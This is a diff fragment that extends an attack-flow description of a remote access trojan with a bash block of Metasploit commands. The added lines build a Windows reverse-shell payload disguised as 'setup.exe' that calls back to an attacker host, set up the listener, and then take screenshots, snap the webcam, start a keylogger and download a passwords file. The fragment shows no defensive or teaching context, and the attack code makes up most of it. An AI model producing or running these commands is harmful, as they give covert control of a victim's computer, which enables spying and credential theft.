@@ -12,3 +12,23 @@ Attack flow:
 3. Victim runs it — RAT server installs silently, adds persistence to startup
 4. RAT connects back to attacker's C2 (Command and Control) server
 5. Attacker gets full control panel — files, processes, webcam, keylogger, shell
+
+```bash
+# example using msfvenom to generate a RAT payload (Metasploit)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o setup.exe
+
+# set up the handler on attacker side
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST attacker_ip
+set LPORT 4444
+run
+
+# once victim runs setup.exe, attacker gets meterpreter session
+# full control - screenshot, webcam, keylog, file browse, shell
+screenshot
+webcam_snap
+keyscan_start
+download passwords.txt
+```
